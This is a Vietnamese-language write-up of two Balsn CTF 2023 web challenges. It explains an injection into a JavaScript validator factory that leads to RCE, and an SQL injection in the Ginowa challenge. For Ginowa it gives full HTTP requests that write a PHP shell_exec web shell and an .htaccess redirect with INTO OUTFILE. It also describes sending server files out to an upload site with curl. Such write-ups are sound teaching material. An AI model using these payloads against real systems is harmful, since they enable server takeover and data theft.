## Balsn CTF 2023 web writeup

### SaaS (solve: 19)
Vấn đề của bài này là ta control được 1 phần object truyền vào `validatorFactory`, dẫn đến ta kiểm soát được 1 phần function được tạo ra, từ đó khi function này được thực thi thì ta có thể inject js code vào để thực thi cùng.

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/6fb3f047-0822-4186-beb1-2440f1498daf)

Trace một tí ta sẽ đến đoạn này
![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/392d4bab-dc39-470e-930a-c31bef444985)

`required` là một array được lấy từ object ban đầu mà ta truyền vào, đây là sink cuối. Vậy chỉ cần một post data như thế này ta sẽ thành công thực hiện RCE được server

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/941fff68-e619-406d-8189-90c622691c6b)

Ở phần request line thì `http://a.saas/whowilldothis/b3703f0b-c6a9-4ba6-b80b-32860238aaaa` là để server_name thỏa mãn `*.saas` trong khi host header sẽ được set là `easy++++++` nhằm bypass đoạn check của nginx

### Ginowa (solve: 13)
Bài này được setup với 1 proxy ở frontend thực hiện giao tiếp với api ở phía backend chủ yếu thông qua file `api.php`. Ở backend ta thấy 1 lỗi SQL Injection khá rõ ràng xuất phát từ việc dùng prepare statement sai cách

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/f9adedfe-4b4b-4145-aaf1-9d5904f35798)

Bài cho ta 3 thông tin đó là info.php ở frontend, backend và thông tin về các service đang chạy. Intended của bài là lợi dụng 1 việc `LOAD_FILE` có thể dùng với wildcard, từ đó đọc file binary ở server, reverse một chút và đọc được flag. Ở đây mình sẽ nói đến một cách làm khác của mình:

Do thấy được ta có quyền ghi file, nhưng file ghi lên bị xóa sau một khoản thời gian nhất định, ngay cả khi có thể spam request để liên tục ghi file đó lại sau khi bị xóa thì cũng không thể truy cập vào file shell đã ghi như cách thông thường để chạy nó được. Tới đây mình nghĩ ra cách ghi 1 file .htaccess lên server để chuyển hướng truy cập vào file php vừa ghi mỗi khi truy cập vào api.php, ta sẽ cho race 2 luồng ghi file a.php và luồng ghi file .htaccess lại, ở file a.php ta sẽ trả về 1 đoạn JSON hợp lệ cùng với "name" là kết quả của lệnh `shell_exec` để đọc được output của lệnh.

Upload file `a.php`:
```
GET /?id=<@urlencode>11111'+UNION+SELECT+'','','','<?php+echo+json_encode(["status"+=>+"ok","name"+=>"result:".shell_exec("dir C:\\")])+?>'+INTO+OUTFILE+'C:\\xampp\\htdocs\\a.php<@/urlencode> HTTP/1.1
Host: ginowa-1.balsnctf.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```

Upload .htaccess:
```
GET /?id=<@urlencode>11111'+UNION+SELECT+'','','','Redirect+301+/api.php+/a.php'+INTO+OUTFILE+'C:\\xampp\\htdocs\\.htaccess<@/urlencode> HTTP/1.1
Host: ginowa-1.balsnctf.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```

Race 2 luồng này ta sẽ đọc được kết quả từ lệnh dir, từ đó biết tên file PE. Sau đó mình upload file PE này lên https://bashupload.com/ bằng curl rồi tải về đọc, đưa vào IDA thấy được nó đang cố gắng mở một file `s` và thực hiện 1 hàm decrypt, thử dùng cách upload bằng curl cũ để upload cả file `s` cùng thư mục lên và tải về, sau đó chạy file PE ban đầu ta có được flag:

![image](https://github.com/CP04042K/CTF-writeups/assets/35491855/d14ef92b-35e2-4330-ad94-3b7b9166cf06)
